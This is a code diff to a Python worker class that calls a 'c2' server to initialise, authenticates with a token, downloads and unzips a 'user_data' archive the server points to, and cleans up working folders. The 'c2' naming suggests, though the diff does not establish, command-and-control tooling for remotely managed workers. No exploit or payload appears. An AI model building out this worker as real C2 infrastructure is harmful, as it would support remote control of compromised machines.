@@ -30,9 +30,14 @@ logging.info("start")
 class Worker:
     
     def initialize(self):
-            breakpoint()
             logging.info("start initialize")
             try:
+                
+                extracted_folder = "user_data_extracted"
+                download_directory="downloads";
+                remove_directory(download_directory)
+                remove_directory(extracted_folder)
+                
                 response = send_data_to_c2("POST", "initialize/", {})
                 if response.status_code==500:
                     logging.error("error in c2 initialize ( check c2 logs )")
@@ -41,7 +46,7 @@ class Worker:
                     logging.error("unauth please check token")
                     return False
                 response=response.json()
-                user_data_file = download_file(response.get("user_data_path"))
+                user_data_file = download_file(response.get("user_data_path"),download_directory)
                 
                 if user_data_file == False:
                     logging.error("c2 dont sended any user data")
@@ -52,7 +57,7 @@ class Worker:
                         return False
                     
                 extracted_files = extract_zip(user_data_file)
-                remove_directory(user_data_file)
+                remove_directory(download_directory)
                 self.id = response.get("worker_id")
                 self.user_data_path = "user_data_extracted"
             except Exception as e:
